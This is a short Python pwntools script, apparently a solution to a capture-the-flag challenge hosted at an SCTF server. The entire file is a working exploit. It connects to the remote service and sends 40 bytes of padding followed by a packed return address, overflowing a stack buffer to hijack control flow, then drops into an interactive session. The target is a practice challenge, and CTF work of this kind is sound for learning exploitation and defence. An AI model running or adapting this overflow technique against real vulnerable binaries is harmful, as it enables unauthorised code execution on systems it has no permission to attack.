#!/usr/bin/env python

import struct
from pwn import *

def p(x):
    return struct.pack('<L', x)

ret = p(0x080484ad)
r = remote('pwn.problem.sctf.io', 1338)
r.sendline("A" * 40 + ret)

r.interactive()
